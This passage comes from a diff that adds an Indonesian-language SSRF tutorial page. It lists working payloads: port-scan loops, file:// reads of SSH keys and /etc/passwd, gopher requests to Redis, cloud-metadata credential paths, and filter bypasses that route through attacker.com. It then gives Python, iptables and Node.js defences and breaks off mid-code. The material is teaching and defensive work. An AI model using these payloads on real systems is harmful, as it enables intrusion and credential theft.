.labelBkg{background-color:rgba(232, 232, 232, 0.5);}#mermaid-svg .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mermaid-svg .cluster text{fill:#333;}#mermaid-svg .cluster span{color:#333;}#mermaid-svg div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mermaid-svg .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mermaid-svg rect.text{fill:none;stroke-width:0;}#mermaid-svg .icon-shape,#mermaid-svg .image-shape{background-color:rgba(232,232,232, 0.8);text-align:center;}#mermaid-svg .icon-shape p,#mermaid-svg .image-shape p{background-color:rgba(232,232,232, 0.8);padding:2px;}#mermaid-svg .icon-shape rect,#mermaid-svg .image-shape rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mermaid-svg .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#mermaid-svg .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#mermaid-svg :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker id="mermaid-svg_flowchart-v2-pointEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-pointStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="4.5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 5 L 10 10 L 10 0 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-circleEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="11" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-circleStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-1" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-crossEnd" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="12" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><marker id="mermaid-svg_flowchart-v2-crossStart" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="-1" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><g class="root"><g class="clusters"/><g class="edgePaths"><path d="M138,110L138,114.167C138,118.333,138,126.667,138,134.333C138,142,138,149,138,152.5L138,156" id="L_N0_N1_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N0_N1_0" data-points="W3sieCI6MTM4LCJ5IjoxMTB9LHsieCI6MTM4LCJ5IjoxMzV9LHsieCI6MTM4LCJ5IjoxNjB9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,238L138,242.167C138,246.333,138,254.667,138,262.333C138,270,138,277,138,280.5L138,284" id="L_N1_N2_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N1_N2_0" data-points="W3sieCI6MTM4LCJ5IjoyMzh9LHsieCI6MTM4LCJ5IjoyNjN9LHsieCI6MTM4LCJ5IjoyODh9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,390L138,394.167C138,398.333,138,406.667,138,414.333C138,422,138,429,138,432.5L138,436" id="L_N2_N3_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N2_N3_0" data-points="W3sieCI6MTM4LCJ5IjozOTB9LHsieCI6MTM4LCJ5Ijo0MTV9LHsieCI6MTM4LCJ5Ijo0NDB9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,518L138,522.167C138,526.333,138,534.667,138,542.333C138,550,138,557,138,560.5L138,564" id="L_N3_N4_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N3_N4_0" data-points="W3sieCI6MTM4LCJ5Ijo1MTh9LHsieCI6MTM4LCJ5Ijo1NDN9LHsieCI6MTM4LCJ5Ijo1Njh9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/><path d="M138,670L138,674.167C138,678.333,138,686.667,138,694.333C138,702,138,709,138,712.5L138,716" id="L_N4_N5_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style=";" data-edge="true" data-et="edge" data-id="L_N4_N5_0" data-points="W3sieCI6MTM4LCJ5Ijo2NzB9LHsieCI6MTM4LCJ5Ijo2OTV9LHsieCI6MTM4LCJ5Ijo3MjB9XQ==" marker-end="url(#mermaid-svg_flowchart-v2-pointEnd)"/></g><g class="edgeLabels"><g class="edgeLabel"><g class="label" data-id="L_N0_N1_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N1_N2_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N2_N3_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N3_N4_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g><g class="edgeLabel"><g class="label" data-id="L_N4_N5_0" transform="translate(0, 0)"><foreignObject width="0" height="0"><div xmlns="http://www.w3.org/1999/xhtml" class="labelBkg" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="edgeLabel "></span></div></foreignObject></g></g></g><g class="nodes"><g class="node default  " id="flowchart-N0-0" transform="translate(138, 59)"><rect class="basic label-container" style="" x="-130" y="-51" width="260" height="102"/><g class="label" style="" transform="translate(-100, -36)"><rect/><foreignObject width="200" height="72"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>1 SSRF pada WAF Configuration POST /waf/data-pr...</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N1-1" transform="translate(138, 199)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"/><g class="label" style="" transform="translate(-100, -24)"><rect/><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>2 AWS Metadata Request GET http://169.254.169.2...</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N2-2" transform="translate(138, 339)"><rect class="basic label-container" style="" x="-130" y="-51" width="260" height="102"/><g class="label" style="" transform="translate(-100, -36)"><rect/><foreignObject width="200" height="72"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>3 Pencurian IAM Credentials AccessKeyId: AKIA.....</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N3-3" transform="translate(138, 479)"><rect class="basic label-container" style="" x="-130" y="-39" width="260" height="78"/><g class="label" style="" transform="translate(-100, -24)"><rect/><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>4 Akses S3 Bucket aws s3 ls s3://bucket-with-se...</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N4-4" transform="translate(138, 619)"><rect class="basic label-container" style="" x="-130" y="-51" width="260" height="102"/><g class="label" style="" transform="translate(-100, -36)"><rect/><foreignObject width="200" height="72"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>5 Download 100M+ Records Nama, SSN, tanggal lah...</p></span></div></foreignObject></g></g><g class="node default  " id="flowchart-N5-5" transform="translate(138, 771)"><rect class="basic label-container" style="" x="-130" y="-51" width="260" height="102"/><g class="label" style="" transform="translate(-100, -36)"><rect/><foreignObject width="200" height="72"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>LESSON LEARNED Jangan berikan IAM role akses te...</p></span></div></foreignObject></g></g></g></g></g></svg></div>
+</div>
+    </div>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 6: Teknik Serangan     -->
+      <!-- ============================== -->
+      <h2 id="teknik-serangan">6. Teknik Serangan SSRF</h2>
+
+      <h3>6.1 Port Scanning via SSRF</h3>
+      <p>Penyerang dapat menggunakan SSRF untuk memindai port pada server internal. Response time atau error message yang berbeda-beda dapat mengindikasikan status port.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Port Scanning via SSRF</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># Port Scanning menggunakan response time analysis
+# Port terbuka: connection berhasil, response time normal
+# Port tertutup: connection refused, error cepat
+# Port ter-filter: timeout (biasanya 10-30 detik)
+
+# Scan port umum di server internal
+for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
+    echo "Scanning port $port..."
+    curl -s -o /dev/null -w "Port $port: %{time_total}s\n" \
+        "https://app.com/fetch?url=http://192.168.1.10:$port/" \
+        --max-time 5
+done
+
+# Contoh output:
+# Port 22: timeout (filtered)
+# Port 80: 0.045s (open - HTTP)
+# Port 443: 0.052s (open - HTTPS)
+# Port 3306: timeout (filtered)
+# Port 8080: 0.038s (open - internal admin)
+# Port 6379: timeout (filtered)</code></pre>
+      </div>
+
+      <h3>6.2 File Read via Protocol Handlers</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">File Read via SSRF Protocol Handlers</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># Berbagai protocol handler yang bisa dimanfaatkan:
+
+# file:// — Membaca file lokal
+https://app.com/fetch?url=file:///etc/passwd
+https://app.com/fetch?url=file:///proc/self/environ
+https://app.com/fetch?url=file:///proc/self/cmdline
+https://app.com/fetch?url=file:///root/.ssh/id_rsa
+
+# dict:// — Menggunakan DICT protocol
+https://app.com/fetch?url=dict://redis:6379/info
+
+# gopher:// — Raw TCP (sangat powerful!)
+https://app.com/fetch?url=gopher://redis:6379/_*1%0d%0a$8%0d%0aredis-cmd%0d%0a
+
+# tftp:// — Trivial File Transfer Protocol
+https://app.com/fetch?url=tftp://attacker.com/file
+
+# ldap:// — Lightweight Directory Access Protocol
+https://app.com/fetch?url=ldap://ldap-server:389/
+
+# jar:// — Java Archive URL (untuk SSRF ke RCE di Java)
+https://app.com/fetch?url=jar:http://attacker.com/malicious.jar!/exploit.class</code></pre>
+      </div>
+
+      <h3>6.3 SSRF ke Cloud Metadata</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Cloud Metadata SSRF Attack</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === AWS (IMDSv1 — rentan) ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# === AWS (IMDSv2 — lebih aman, perlu token) ===
+# Step 1: Get token
+PUT http://169.254.169.254/latest/api/token
+Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# Step 2: Use token
+GET http://169.254.169.254/latest/meta-data/
+Header: X-aws-ec2-metadata-token: <token>
+
+# === Google Cloud ===
+http://metadata.google.internal/computeMetadata/v1/
+  ?alt=json
+Header: Metadata-Flavor: Google
+
+# === Azure ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+  ?format=json
+Header: Metadata: true
+
+# === DigitalOcean ===
+http://169.254.169.254/metadata/v1/
+
+# === Kubernetes ===
+https://kubernetes.default.svc/
+https://kubernetes.default.svc:443/api/v1/namespaces/
+
+# === Oracle Cloud ===
+http://169.254.169.254/opc/v1/instance/</code></pre>
+      </div>
+
+      <h3>6.4 DNS Rebinding untuk SSRF</h3>
+
+      <p><strong>DNS Rebinding</strong> adalah teknik canggih yang memanfaatkan sistem DNS untuk mengubah resolved IP address antar request. Teknik ini sangat efektif untuk melewati whitelist yang berbasis hostname.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">DNS Rebinding Attack Flow</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Konsep DNS Rebinding ===
+
+# 1. Attacker mendaftarkan domain: rebinding.attacker.com
+# 2. DNS server attacker dikonfigurasi dengan TTL sangat rendah
+
+# Request pertama (validasi oleh aplikasi):
+# GET rebinding.attacker.com → 1.2.3.4 (IP attacker, VALID)
+# TTL: 0 detik
+
+# Request kedua (oleh aplikasi untuk fetch):
+# GET rebinding.attacker.com → 169.254.169.254 (IP metadata, INTERNAL!)
+# TTL: 0 detik
+
+# === Tools untuk DNS Rebinding ===
+# 1. rbndr.us — DNS rebinding service
+#    http://rbndr.us/<first_ip>-<second_ip>
+
+# 2. Taviso's rbndr — Custom DNS server
+#    https://github.com/taviso/rbndr
+
+# 3. Singularity — Framework lengkap untuk DNS rebinding
+#    https://github.com/nccgroup/singularity
+
+# Contoh penggunaan:
+# 1. Generate rebinding URL untuk AWS metadata
+curl "http://rbndr.us/169.254.169.254"
+# URL pertama → resolve ke IP attacker (memenuhi whitelist)
+# URL kedua → resolve ke 169.254.169.254 (mengakses metadata)
+
+# 2. Gunakan dalam serangan SSRF
+https://app.com/fetch?url=http://rebind.attacker.com/
+# Aplikasi memvalidasi URL → OK (resolve ke IP attacker)
+# Aplikasi fetch URL → resolve ke metadata endpoint!</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 7: Bypass Filter       -->
+      <!-- ============================== -->
+      <h2 id="bypass-filter">7. Bypass Filter &amp; WAF</h2>
+
+      <p>Sering kali, pengembang menerapkan berbagai filter untuk mencegah SSRF. Namun, filter yang tidak sempurna justru memberikan ilusi keamanan. Berikut teknik-teknik bypass yang perlu dipahami oleh security engineer untuk membangun defensi yang lebih kuat.</p>
+
+      <h3>7.1 Bypass Filter IP Address</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Teknik Bypass IP Filter</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Bypass filter yang hanya memblokir "127.0.0.1" ===
+
+# 1. Representasi IP alternatif
+http://127.0.0.1              ← diblokir
+http://127.1                  ← bypass! (IP singkat)
+http://0.0.0.0               ← bypass! (zero address)
+http://localhost              ← bypass! (hostname)
+http://[::1]                  ← bypass! (IPv6 loopback)
+http://0x7f000001             ← bypass! (hexadecimal)
+http://2130706433             ← bypass! (decimal)
+http://017700000001           ← bypass! (octal)
+http://127.0.0.1.nip.io       ← bypass! (wildcard DNS)
+http://127.0.0.1.sslip.io     ← bypass! (wildcard DNS)
+http://0177.0.0.1             ← bypass! (leading zero octal)
+http://127.0.00.1             ← bypass! (extra zeros)
+http://127.0.0.1%2523         ← bypass! (URL encoded #)
+http://127.0.0.1%00           ← bypass! (null byte - PHP < 5.3.4)
+
+# 2. Menggunakan URL parsing inconsistency
+http://valid-domain.com#@127.0.0.1
+http://127.0.0.1@valid-domain.com
+http://valid-domain.com\@127.0.0.1
+
+# 3. Decimal IP untuk target lain
+# 10.0.0.1 = 167772161
+# 172.16.0.1 = 2886729729
+# 192.168.1.1 = 3232235777
+http://3232235777/  →  192.168.1.1
+
+# 4. Mixed format
+http://0177.0.0.1       →  127.0.0.1
+http://127.0x7F.0x01    →  127.0.0.1
+http://0177.0x0.0x0.1   →  127.0.0.1</code></pre>
+      </div>
+
+      <h3>7.2 Bypass Whitelist dengan Redirect</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Redirect Bypass untuk Whitelist</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Jika aplikasi hanya mengizinkan URL dari domain tertentu ===
+
+# 1. Gunakan URL redirector (bit.ly, t.co, dll.)
+#    yang redirect ke target internal
+
+# Buat redirect: https://bit.ly/3xabc → http://169.254.169.254/
+curl "https://app.com/fetch?url=https://bit.ly/3xabc"
+# Aplikasi memvalidasi bit.ly (allowed) → fetch
+# bit.ly redirect ke metadata endpoint!
+
+# 2. Gunakan layanan redirect lain
+# - http://tinyurl.com/create.php
+# - https://is.gd/create.php
+# - Short link dari link shortener yang dimiliki attacker
+
+# 3. HTTP Redirect Server
+# Buat server sederhana di attacker.com:
+# GET /redirect → 302 Location: http://169.254.169.254/
+curl "https://app.com/fetch?url=https://attacker.com/redirect"
+
+# 4. Open Redirect di aplikasi lain
+# https://app.com/logout?next=http://169.254.169.254/
+# Jika app.com juga memiliki open redirect:
+curl "https://app.com/fetch?url=https://app.com/logout?next=http://169.254.169.254/"</code></pre>
+      </div>
+
+      <h3>7.3 Bypass HTTPS Filter</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Bypass Filter HTTPS</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Jika aplikasi hanya mengizinkan HTTPS ===
+
+# 1. Port trick — HTTPS di port HTTP
+http://internal-target:443/
+# Banyak server menerima HTTP di port 443
+
+# 2. Redirect dari HTTP ke HTTPS
+# Buat server yang redirect:
+# http://attacker.com → 301 https://169.254.169.254/
+
+# 3. SSL stripping atau cert bypass
+
+# 4. Menggunakan self-signed certificate
+# Jika aplikasi tidak memverifikasi SSL
+
+# === Bypass filter yang memblokir URL dengan port ===
+# Jika filter memblokir ":" dalam URL:
+# Gunakan entitas HTML
+http://internal:8080@external.com
+http://external.com#http://internal:8080
+https://external.com@internal:8080</code></pre>
+      </div>
+
+      <h3>7.4 Bypass with IPv6 and DNS</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">IPv6 dan DNS Bypass</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === IPv6 Bypass ===
+# Filter mungkin hanya memblokir IPv4
+http://[::]:80/                → 0.0.0.0
+http://[::ffff:127.0.0.1]/    → 127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]/  → 127.0.0.1
+http://[0000::1]/             → ::1 (loopback)
+
+# === DNS Rebinding ===
+# Membuat hostname yang resolve ke IP internal
+# Setelah validasi, DNS berubah ke target internal
+
+# === Subdomain to IP trick ===
+# Buat subdomain yang resolve ke internal IP:
+# evil.attacker.com → A record → 169.254.169.254
+# Jika filter hanya memeriksa domain utama
+curl "https://app.com/fetch?url=http://evil.attacker.com/"</code></pre>
+      </div>
+
+      <h3>7.5 Bypass Filter berbasis Schema</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Schema Filter Bypass</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Jika hanya http/https yang diizinkan ===
+
+# 1. gopher:// — Raw TCP, bisa mengirim request HTTP
+gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0AHost:%20localhost%0d%0A%0d%0A
+
+# 2. dict:// — DICT protocol
+dict://127.0.0.1:6379/info
+
+# 3. file:// — Membaca file
+file:///etc/passwd
+
+# 4. jar:// — Java Archive
+jar:http://attacker.com/exploit.jar!/class.class
+
+# 5. netdoc:// — Java netdoc
+netdoc:///etc/passwd
+
+# 6. scp:// dan sftp:// — Remote file access
+scp://user:password@internal-server/file
+
+# 7. ftp:// — File Transfer Protocol
+ftp://user:password@internal-server/
+
+# 8. smb:// — Server Message Block (Windows)
+smb://internal-server/share/file
+
+# === URL Encoding Trick ===
+# Double encoding
+%2568%2574%2574%2570%253a%252f%252f → http://
+%2567%256f%2570%2568%2565%2572%253a → gopher:
+
+# Unicode normalization
+ｈｔｔｐ://  →  http://
+⾷ｉｌｅ:///  →  file:///</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- SECTION 8: Pencegahan          -->
+      <!-- ============================== -->
+      <h2 id="pencegahan">8. Pencegahan &amp; Mitigasi</h2>
+
+      <p>Pencegahan SSRF memerlukan pendekatan berlapis (defense in depth). Tidak ada satu solusi tunggal yang bisa mencegah semua jenis SSRF. Berikut strategi pencegahan yang direkomendasikan:</p>
+
+      <h3>8.1 Input Validation — Whitelist Approach</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Python — Whitelist URL Validation</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code>import ipaddress
+import socket
+import validators
+from urllib.parse import urlparse
+import struct
+
+# ==========================================
+# WHITELIST URL VALIDATION — Best Practice
+# ==========================================
+
+ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']
+ALLOWED_SCHEMES = ['https']
+BLOCKED_RANGES = [
+    ipaddress.ip_network('10.0.0.0/8'),
+    ipaddress.ip_network('172.16.0.0/12'),
+    ipaddress.ip_network('192.168.0.0/16'),
+    ipaddress.ip_network('127.0.0.0/8'),
+    ipaddress.ip_network('169.254.0.0/16'),
+    ipaddress.ip_network('::1/128'),
+    ipaddress.ip_network('fc00::/7'),
+    ipaddress.ip_network('fe80::/10'),
+]
+
+def is_private_ip(ip_str):
+    """Cek apakah IP termasuk range privat/internal"""
+    try:
+        ip = ipaddress.ip_address(ip_str)
+        for network in BLOCKED_RANGES:
+            if ip in network:
+                return True
+        return False
+    except ValueError:
+        return False
+
+def resolve_and_validate(hostname):
+    """Resolve DNS dan validasi IP hasil resolve"""
+    try:
+        # Gunakan getaddrinfo untuk resolve semua IP
+        addrinfos = socket.getaddrinfo(hostname, None)
+        for family, _, _, _, sockaddr in addrinfos:
+            ip = ipaddress.ip_address(sockaddr[0])
+            for network in BLOCKED_RANGES:
+                if ip in network:
+                    raise ValueError(f"IP {ip} termasuk range privat!")
+        return True
+    except socket.gaierror:
+        raise ValueError(f"Gagal resolve hostname: {hostname}")
+
+def validate_url(url):
+    """Validasi URL lengkap — whitelist approach"""
+    # 1. Parse URL
+    parsed = urlparse(url)
+
+    # 2. Validasi scheme — hanya HTTPS
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        raise ValueError(f"Scheme '{parsed.scheme}' tidak diizinkan")
+
+    # 3. Validasi hostname — harus ada dan valid
+    if not parsed.hostname:
+        raise ValueError("Hostname tidak valid")
+
+    # 4. Whitelist domain
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        raise ValueError(f"Domain '{parsed.hostname}' tidak di whitelist")
+
+    # 5. Resolve DNS dan validasi IP
+    resolve_and_validate(parsed.hostname)
+
+    # 6. Validasi path (opsional — hindari path traversal)
+    if '..' in (parsed.path or ''):
+        raise ValueError("Path traversal terdeteksi")
+
+    return True
+
+# Contoh penggunaan
+try:
+    validate_url("https://api.example.com/data")
+    print("✅ URL valid!")
+except ValueError as e:
+    print(f"❌ Error: {e}")</code></pre>
+      </div>
+
+      <h3>8.2 Network-Level Controls</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Network Segmentation & Firewall Rules</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># ==========================================
+# NETWORK LEVEL DEFENSE
+# ==========================================
+
+# 1. Firewall Rules — Batasi akses dari web server
+# Hanya izinkan akses ke service yang diperlukan
+
+# iptables — Whitelist outbound traffic
+iptables -A OUTPUT -p tcp --dport 443 -d api.example.com -j ACCEPT
+iptables -A OUTPUT -p tcp --dport 443 -d cdn.example.com -j ACCEPT
+iptables -A OUTPUT -p tcp --dport 80 -d api.example.com -j ACCEPT
+iptables -A OUTPUT -j DROP  # Drop semua lainnya
+
+# 2. Network Segmentation
+# Pisahkan web server dari service internal
+# Web server hanya bisa akses service tertentu di port tertentu
+
+# 3. Egress Filtering
+# Batasi outbound traffic dari web server
+# Hanya izinkan ke IP/hostname yang diperlukan
+
+# 4. DNS Sinkhole
+# Redirect DNS internal ke sinkhole untuk mencegah
+# akses ke metadata endpoint
+
+# 5. Cloud Security Groups
+# AWS Security Group: hanya izinkan outbound ke
+# - API Gateway (port 443)
+# - Database (port 5432, dari subnet tertentu saja)
+# Block semua lainnya
+
+# 6. IMDSv2 — Wajibkan token untuk metadata (AWS)
+# Di AWS CLI:
+aws ec2 modify-instance-metadata-options \
+    --instance-id i-1234567890abcdef0 \
+    --http-tokens required \
+    --http-endpoint enabled</code></pre>
+      </div>
+
+      <h3>8.3 Application-Level Prevention</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Node.js — SSRF Prevention Middleware</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code>const express = require('express');
+const { URL } = require('url');
+const dns = require('dns').promises;
+const ipaddr = require('ipaddr.js');
+
+const app = express();
+
+// ==========================================
+// SSRF Prevention Middleware
+// ==========================================
+
+const BLOCKED_NETWORKS = [
+    ipaddr.parseCIDR('10.0.0.0/8'),
+    ipaddr.parseCIDR('172.16.0.0/12'),
+    ipaddr.parseCIDR('192.168.0.0/16'),
+    ipaddr.parseCIDR('127.0.0.0/8'),
+    ipaddr.parseCIDR('169.254.0.0/16'),
+    ipaddr.parseCIDR('::1/128'),
+    ipaddr.parseCIDR('fc00::/7'),
+    ipaddr.parseCIDR('fe80::/10'),
+    ipaddr.parseCIDR('0.0.0.0/8'),
+];
+
+function isBlockedIP(ipStr) {
+    try {
+        const addr = ipaddr.parse(ipStr);
+        for (const [network] of BLOCKED_NETWORKS) {
+            if (addr.match(network)) return true;
+        }
+        // Also block IPv4-mapped IPv6
+        if (addr.kind() === 'ipv6') {
+            const ipv4 = addr.toIPv4Address();
+            if (ipv4) {
+                return BLOCKED_NETWORKS.some(([n]) =>
+                    ipaddr.parse(ipv4.toString()).match(n)
+                );
+            }
+        }
+    } catch (e) {}
+    return false;
+}
+
+async function ssrfProtection(req, res, next) {
+    const targetUrl = req.query.url || req.body.url;
+
+    if (!targetUrl) return next();
+
+    try {
+        const parsed = new URL(targetUrl);
+
+        // 1. Blokir scheme berbahaya
+        const blockedSchemes = ['file', 'gopher', 'dict', 'jar', 'netdoc', 'ftp', 'scp', 'smb'];
+        if (blockedSchemes.includes(parsed.protocol.replace(':', ''))) {
+            return res.status(403).json({ error: 'Schema tidak diizinkan' });
+        }
+
+        // 2. Hanya izinkan HTTP/HTTPS
+        if (!['http:', 'https:'].includes(parsed.protocol)) {
+            return res.status(403).json({ error: 'Hanya HTTP/HTTPS yang diizinkan' });
+        }
+
+        // 3. Resolve hostname
+        const hostname = parsed.hostname;
+        const addresses = await dns.resolve4(hostname);
+
+        // 4. Validasi resolved IP
+        for (const addr of addresses) {
+            if (isBlockedIP(addr)) {
+                return res.status(403).json({
+                    error: 'URL mengarah ke IP internal/privat'
+                });
+            }
+        }
+
+        // 5. Re-validate setelah resolve (DNS rebinding protection)
+        // Simpan resolved IP untuk digunakan saat fetch
+        req._resolvedIP = addresses[0];
+        next();
+
+    } catch (err) {
+        return res.status(400).json({ error: 'URL tidak valid' });
+    }
+}
+
+// Gunakan middleware
+app.use('/fetch', ssrfProtection);
+
+// Fetch endpoint yang aman
+const fetch = require('node-fetch');
+app.get('/fetch', async (req, res) => {
+    try {
+        // Gunakan resolved IP, bukan hostname (anti DNS rebinding)
+        const targetUrl = new URL(req.query.url);
+        targetUrl.hostname = req._resolvedIP;
+        targetUrl.host = `${req._resolvedIP}:${targetUrl.port || 80}`;
+
